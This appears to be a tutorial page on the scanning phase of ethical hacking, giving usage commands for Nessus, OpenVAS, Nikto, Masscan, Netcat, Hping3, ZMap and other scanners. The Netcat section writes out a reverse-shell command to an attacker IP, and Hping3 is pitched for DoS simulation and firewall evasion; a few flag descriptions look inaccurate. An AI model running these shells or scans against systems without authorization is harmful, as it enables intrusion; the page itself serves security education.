Phase 2

Scanning

Identify open ports, services, and vulnerabilities with these powerful scanning tools. The second phase of ethical hacking involves active probing of target systems to discover weaknesses.

Understanding Scanning

Scanning involves actively probing target systems to identify open ports, running services, and potential vulnerabilities. This phase builds on reconnaissance data to map out attack surfaces.

Network Scanning

Identifies live hosts, open ports, and services running on target systems (Nmap, Nessus).

Vulnerability Scanning

Detects known vulnerabilities in systems and applications (OpenVAS, Nikto).

Featured Tools

Nmap

Network mapper for host discovery and service enumeration. The most popular port scanner in cybersecurity.

Nessus

A powerful vulnerability assessment tool used to identify security issues, misconfigurations, and weaknesses in networks and systems.

Vulnerability Scanner Enterprise GUI / CLI
How to Use Nessus
https://localhost:8834
🔹 Description:

Nessus is a widely used vulnerability scanner developed by Tenable. It detects vulnerabilities, missing patches, and configuration issues across systems, services, and networks. It features both a GUI (web interface) and command-line support.

🚀 Common Use Cases:
  1. Access Nessus Web UI:
    https://localhost:8834
  2. Log in and create a new scan:
    Choose templates like "Basic Network Scan" or "Advanced Scan".
  3. Set target IP ranges or subnets (e.g., 192.168.1.0/24)
  4. Launch the scan and review results:
    Check severity levels: Info, Low, Medium, High, Critical.
📘 CLI Usage (Nessuscli):
  • nessuscli update — Update plugin database
  • nessuscli fix --register — Register or activate a license
  • nessuscli lsuser — List users
⚠️ Notes:
  • Nessus must be started as a service: sudo systemctl start nessusd
  • The free version has limitations; for enterprise-grade use, consider Tenable.io or Nessus Pro.
  • Scans can be exported in multiple formats like HTML, PDF, and CSV.
OpenVAS

An open-source vulnerability scanning framework for detecting security issues, misconfigurations, and known vulnerabilities in networked systems.

Vulnerability Scanner Open Source GVM
How to Use OpenVAS
sudo gvm-start
🔹 Description:

OpenVAS (Open Vulnerability Assessment System) is a full-featured open-source vulnerability scanner that is part of the Greenbone Vulnerability Management (GVM) framework. It helps detect vulnerabilities, misconfigurations, and missing updates on systems.

🚀 Common Use Cases:
  1. Start OpenVAS services:
    sudo gvm-start
  2. Access web interface:
    https://localhost:9392
  3. Log in to Greenbone Security Assistant (GSA) using default or configured credentials
  4. Create new target and scan tasks from the dashboard
  5. Launch scans and review vulnerability reports by severity and CVE details
📘 CLI Usage (Advanced):
  • gvm-check-setup — Check if everything is configured properly
  • gvm-feed-update — Update vulnerability feed
  • gvmd --get-scanners — List available scanners
⚠️ Notes:
  • Initial setup can take time as vulnerability feeds are downloaded.
  • Default URL: https://127.0.0.1:9392
  • Ensure all services (scanner, manager, and web UI) are running via gvm-start.

All Scanning Tools

Nikto

A web server vulnerability scanner that performs comprehensive tests for dangerous files, outdated server software, and other security issues.

Web Scanner HTTP/HTTPS Open Source
How to Use Nikto
nikto -h http://example.com
🔹 Description:

Nikto is an open-source web server scanner that detects over 6,700 potentially dangerous files or programs, checks for outdated versions, and scans server configurations for security issues.

🚀 Common Use Cases:
  • Scan a website for vulnerabilities:
    nikto -h http://example.com
  • Scan HTTPS websites:
    nikto -h https://example.com
  • Use a specific port:
    nikto -h example.com -p 8080
  • Output to a file (HTML format):
    nikto -h example.com -o result.html -Format html
📘 Explanation of Flags:
  • -h — Target host (IP or domain)
  • -p — Custom port
  • -o — Output file
  • -Format — Output format (csv, txt, html, xml)
  • -ssl — Force SSL (if not auto-detected)
⚠️ Notes:
  • Nikto is a passive scanner and won’t exploit vulnerabilities.
  • It can generate a lot of requests — avoid scanning production servers without permission.
  • Consider combining it with Burp Suite or OWASP ZAP for deeper assessments.
Masscan

An ultra-fast TCP port scanner capable of scanning the entire Internet in minutes. Ideal for high-speed reconnaissance.

Port Scanning High-Speed Open Source
How to Use Masscan
masscan -p1-65535 192.168.1.0/24 --rate=1000
🔹 Description:

Masscan is the fastest Internet port scanner. It can scan the entire IPv4 address space in under 10 minutes, depending on your bandwidth. It's best suited for large-scale reconnaissance.

🚀 Common Use Cases:
  • Scan all ports on a local subnet:
    masscan -p1-65535 192.168.1.0/24
  • Scan specific ports:
    masscan -p80,443 10.0.0.0/8
  • Save results to a file:
    masscan -p80 192.168.0.0/24 -oG output.txt
  • Limit scan rate:
    --rate=1000 (packets per second)
📘 Explanation of Flags:
  • -p — Define port or range (e.g. 1-65535)
  • -oG — Save output in grepable format
  • --rate — Throttle packets per second to avoid overwhelming networks
  • --banners — Grab banners (like HTTP headers)
⚠️ Notes:
  • Masscan sends raw packets—requires root privileges on Linux.
  • It does not perform service detection—use Nmap after discovery.
  • Always scan networks you are authorized to test.
Netcat

A lightweight networking tool used for reading, writing, and creating TCP/UDP connections. Ideal for debugging, reverse shells, and file transfers.

Networking TCP/UDP Open Source
How to Use Netcat
nc -lvnp 4444
🔹 Description:

Netcat (often called nc) is a flexible command-line networking tool used for manual TCP/UDP communication. It can create reverse shells, listen on ports, transfer files, and even scan for open ports.

🚀 Common Use Cases:
  • Start a listener on port 4444:
    nc -lvnp 4444
  • Connect to the listener (reverse shell):
    nc [attacker-ip] 4444 -e /bin/bash
  • Send a file:
    nc [target-ip] 1234 < file.txt
  • Receive a file:
    nc -lvnp 1234 > received.txt
  • Scan for open ports:
    nc -zv 192.168.1.1 1-1000
📘 Explanation of Flags:
  • -l — Listen for incoming connections
  • -v — Verbose output (show connection details)
  • -n — Skip DNS resolution (numeric only)
  • -p — Specify local port
  • -z — Zero-I/O mode (useful for scanning)
  • -e — Execute a command after connection (e.g. /bin/bash)
⚠️ Notes:
  • The -e option may be disabled in some versions (e.g., OpenBSD's nc).
  • Netcat is great for CTFs, but should be used ethically and with permission in real environments.
  • Use ncat (from Nmap) if you need advanced encryption support.
Hping3

A packet crafting tool used for network scanning, firewall testing, and DoS simulation. Useful for analyzing TCP/IP stack behavior.

Packet Crafting Firewall Testing Command Line
How to Use Hping3
hping3 -S 192.168.1.1 -p 80 -c 5
🔹 Description:

Hping3 is a network tool able to send custom TCP/IP packets. It's often used for firewall testing, TCP scanning, DoS simulations, and TTL/hop limit tracing.

🚀 Common Use Cases:
  • SYN scan on port 80:
    hping3 -S 192.168.1.1 -p 80 -c 5
  • Ping using TCP:
    hping3 -S 192.168.1.1 -p 443
  • UDP scan:
    hping3 --udp -p 53 -c 5 192.168.1.1
  • Traceroute with spoofed TTL:
    hping3 --traceroute -V -S -p 80 192.168.1.1
📘 Explanation of Flags:
  • -S — Send SYN packets (used in scans)
  • -p — Specify the target port
  • -c — Number of packets to send
  • --udp — Switch protocol to UDP
  • --traceroute — Perform a traceroute
  • -V — Verbose output
⚠️ Notes:
  • Run as root to send raw packets (e.g. SYN scans).
  • Use carefully—sending large volumes of traffic can simulate DoS behavior.
  • Great for evading firewalls and analyzing network filters.
ZMap

A lightning-fast, command-line network scanner for Internet-wide port scanning. Optimized for speed and scalability.

Port Scanning High-Speed Open Source
How to Use ZMap
zmap -p 80 192.168.1.0/24 -r 1000
🔹 Description:

ZMap is a fast, single-packet network scanner optimized for performing Internet-wide scans. It is ideal for researchers and red teams needing to identify large sets of devices quickly.

🚀 Common Use Cases:
  • Scan for open HTTP ports:
    zmap -p 80 192.168.1.0/24
  • Adjust scan rate:
    zmap -p 443 192.168.0.0/16 -r 5000
  • Output live hosts to a file:
    zmap -p 22 -o results.txt 10.0.0.0/8
📘 Explanation of Flags:
  • -p — Target port number (e.g., 80 for HTTP)
  • -r — Send rate (packets per second)
  • -o — Output file for responsive IPs
  • -B — Bandwidth limit (e.g., 10M for 10 Mbps)
⚠️ Notes:
  • ZMap sends single probes—it's not a full port scanner like Nmap.
  • Use --probe-module for banner grabbing and deeper checks.
  • Always ensure you are scanning networks you are authorized to audit.
TCPTraceroute

A traceroute implementation that uses TCP packets instead of ICMP/UDP, allowing route tracing through firewalls and filtered networks.

Network Mapping TCP-Based Bypass Filters
How to Use TCPTraceroute 
tcptraceroute 192.168.1.1 80
🔹 Description:

TCPTraceroute is a diagnostic tool used to map the path packets take to reach a remote host using TCP instead of traditional ICMP. This allows it to bypass many firewalls and filters that block ping or UDP-based traceroute.

🚀 Common Use Cases:
  • Trace path to web server on port 80:
    tcptraceroute example.com 80
  • Trace route to SSH service:
    tcptraceroute 192.168.0.10 22
  • Specify interface:
    tcptraceroute -i eth0 10.0.0.1 443
📘 Explanation of Flags:
  • -p — Destination port to probe (default is 80)
  • -n — Do not resolve hostnames (faster output)
  • -i — Use specific network interface
  • -q — Number of queries per hop (default: 3)
⚠️ Notes:
  • Requires root privileges to run raw packet operations.
  • Ideal when ICMP and UDP are filtered, but TCP is open.
  • Great for red team recon and stealthy mapping.
DNSenum

A powerful Perl script for DNS enumeration. Helps discover subdomains, name servers, zone transfers, and more.

Reconnaissance DNS Analysis Open Source
How to Use DNSenum
dnsenum example.com
🔹 Description:

DNSenum is a DNS enumeration tool written in Perl. It helps gather valuable information about a domain, such as name servers, mail servers, subdomains, and performs zone transfers when possible.

🚀 Common Use Cases:
  • Basic domain enumeration:
    dnsenum example.com
  • Brute-force subdomains:
    dnsenum --enum example.com
  • Use custom wordlist:
    dnsenum --dnsserver 8.8.8.8 -f wordlist.txt example.com
  • Check for zone transfers:
    dnsenum --noreverse example.com
📘 Explanation of Flags:
  • --enum — Performs full enumeration (subdomains, zone transfers, etc.)
  • -f — Specify a file for subdomain brute-forcing
  • --dnsserver — Set DNS server to use (e.g. 8.8.8.8)
  • --noreverse — Disable reverse lookup of IPs
⚠️ Notes:
  • Zone transfers only work if the DNS server is misconfigured to allow AXFR requests.
  • Perl must be installed, and the script must have execution permissions.
  • Use responsibly and only on domains you are authorized to test.
WhatWeb

Website fingerprinting tool that detects technologies used by a web server, including CMS, frameworks, analytics, and plugins.

Reconnaissance Web Fingerprinting Open Source
How to Use WhatWeb
whatweb https://example.com
🔹 Description:

WhatWeb identifies websites by analyzing HTTP headers, HTML content, JavaScript, and more. It helps discover technologies like CMSs, frameworks, server types, and analytics tools.

🚀 Common Use Cases:
  • Basic scan of a website:
    whatweb https://example.com
  • Scan multiple URLs from a list:
    whatweb -i urls.txt
  • Verbose output with detailed info:
    whatweb -v https://target.com
  • Aggressive mode for deeper checks:
    whatweb -a 3 https://target.com
📘 Explanation of Flags:
  • -v — Verbose output
  • -i — Input file with list of targets
  • -a — Aggression level (1-3)
  • --log-json — Save results in JSON format
⚠️ Notes:
  • WhatWeb is ideal for stealthy or aggressive recon, depending on settings.
  • Supports plugins for custom fingerprinting.
  • Use ethically on authorized targets only.
Skipfish

A high-speed web application scanner designed to map and assess vulnerabilities through recursive crawling and fuzzing.

Web Security Scanner Fuzzer
How to Use Skipfish
skipfish -o output https://example.com
🔹 Description:

Skipfish is an active web application security reconnaissance tool that performs recursive crawling and dictionary-based fuzzing to detect vulnerabilities like XSS, SQLi, header injection, and outdated components.

🚀 Common Use Cases:
  • Basic scan:
    skipfish -o output https://example.com
  • Limit number of requests:
    skipfish -o output -m 1000 https://target.com
  • Use a custom wordlist:
    skipfish -W custom.dict -o output https://target.com
  • Authentication support:
    skipfish -A user:password -o output https://intranet.site
📘 Explanation of Flags:
  • -o — Output directory for HTML report
  • -W — Wordlist file for fuzzing and crawling
  • -m — Max number of HTTP requests
  • -A — HTTP authentication (username:password)
⚠️ Notes:
  • Output is saved as a comprehensive HTML report.
  • Skipfish is aggressive—limit request count when scanning production systems.
  • Ensure you’re authorized to scan the target web app.
Wapiti

A web vulnerability scanner that audits websites by injecting payloads to identify flaws such as XSS, SQLi, and file disclosure.

Web Security Vulnerability Scanner Open Source
How to Use Wapiti
wapiti https://example.com -o output
🔹 Description:

Wapiti is a command-line web application vulnerability scanner that supports both blind and visible injections. It crawls the website, detects forms, and injects payloads to test for vulnerabilities such as SQLi, XSS, CRLF, file inclusion, and more.

🚀 Common Use Cases:
  • Basic scan:
    wapiti https://example.com -o output
  • Enable verbose output:
    wapiti https://example.com -v 2
  • Scan only selected modules:
    wapiti https://example.com -m xss,sql
  • Scan behind authentication:
    wapiti -u https://target.com -c cookie.txt
📘 Explanation of Flags:
  • -o — Output directory for HTML or XML reports
  • -v — Verbosity level (0–2)
  • -m — Choose specific modules (e.g., xss, file, backup, sqli)
  • -c — Use cookie file to access authenticated areas
⚠️ Notes:
  • Wapiti supports both GET and POST method testing.
  • Output reports are generated in HTML, XML, JSON, or TXT format.
  • Make sure you have permission to test any target.
Dirb

A simple and fast web content scanner that uses a wordlist to brute-force directories and files on web servers.

Web Recon Directory Brute Force Wordlist Based
How to Use Dirb
dirb https://example.com
🔹 Description:

Dirb is a command-line-based content scanner for web applications. It uses a wordlist to brute-force URLs, attempting to discover hidden directories and files on a web server.

🚀 Common Use Cases:
  • Basic directory scan:
    dirb https://target.com
  • Use a custom wordlist:
    dirb https://target.com /usr/share/wordlists/common.txt
  • Ignore 403 errors:
    dirb https://target.com -f
  • Recursive scan (less common):
    dirb https://target.com -r
📘 Explanation of Flags:
  • -f — Filter and show forbidden pages (403s)
  • -r — Recursive scan (try discovered directories too)
  • -o — Output results to a file
  • -S — Silent mode (no banners)
⚠️ Notes:
  • Dirb uses HTTP GET requests; it's fast and lightweight but limited for POST-based discovery.
  • Works best with a good wordlist (like common.txt or big.txt).
  • Use responsibly and only on authorized domains.
Amap

A network scanner designed to identify applications and services running on open ports, even when the services use non-standard ports.

Service Detection Banner Grabbing Open Source
How to Use Amap
amap 192.168.1.1 21,22,80
🔹 Description:

Amap (Application MAPper) is a network service fingerprinting tool. Unlike port scanners like Nmap, Amap tries to identify the application running on a port by analyzing responses and matching them against a signature database.

🚀 Common Use Cases:
  • Scan specific ports on a host:
    amap 192.168.1.1 21,22,80
  • Scan a host using Nmap output:
    amap -b -i nmap-output.txt
  • Enable verbose output:
    amap -v 192.168.1.1 443
📘 Explanation of Flags:
  • -v — Verbose output
  • -b — Use Nmap's grepable output as input
  • -i — Read targets and ports from file
  • -o — Output results to a file
⚠️ Notes:
  • Amap is useful for identifying non-standard services (e.g., SSH on port 8080).
  • The signature database might need updating for modern services.
  • Use it alongside port scanners like Nmap for deeper results.
